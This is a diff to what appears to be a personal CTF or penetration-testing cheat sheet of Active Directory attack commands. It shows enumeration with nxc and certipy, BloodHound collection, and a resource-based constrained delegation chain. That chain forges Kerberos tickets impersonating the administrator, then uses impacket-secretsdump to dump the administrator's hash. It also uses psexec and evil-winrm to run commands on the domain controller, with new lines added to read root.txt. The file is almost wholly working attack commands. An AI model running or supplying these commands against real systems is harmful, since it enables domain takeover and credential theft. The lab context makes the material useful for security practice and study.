@@ -136,13 +136,15 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
 
+## ROOT FLAG
+impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
+
 ## Start Bloodhound
 .\bloodhound-cli resetpwd
 http://127.0.0.1:7474
 neo4j:bloodhoundcommunityedition
 http://127.0.0.1:8080
 admin:RANDOM_PASSWORD
-
 
 ## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
@@ -653,8 +655,8 @@ impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegat
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
 impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"
 export KRB5CCNAME=`pwd`/administrator
+impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
-impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 evil-winrm -i $TARGET -u administrator -H ''
 
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
